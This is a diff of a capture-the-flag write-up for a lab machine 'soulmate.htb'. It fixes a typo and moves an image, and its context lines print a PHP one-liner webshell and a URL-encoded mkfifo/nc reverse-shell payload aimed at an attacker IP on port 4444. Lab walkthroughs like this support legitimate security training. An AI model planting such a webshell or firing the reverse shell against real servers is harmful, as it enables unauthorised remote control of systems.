@@ -90,11 +90,14 @@ Then we find the users and see that we can change their password, after checking
 
 ## ⚡ Web Shell Access
 
-Upload a PHP webshell via bben's account to the webProd where we see the login.php, register.php:
+Upload a PHP webshell via ben's account to the webProd where we see the login.php, register.php:
 
 ```php
 <?=`$_GET[0]`?>
+
 ```
+
+![Alt text for your image](images/image17.png)
 
 Then from the soulmate.htb webapp we see that we can rce
 
@@ -105,8 +108,6 @@ Trigger a reverse shell:
 ```
 http://soulmate.htb/shell.php?0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%2010.10.15.30%204444%20%3E%2Ftmp%2Ff
 ```
-
-![Alt text for your image](images/image17.png)
 
 ![Alt text for your image](images/image15.png)
 
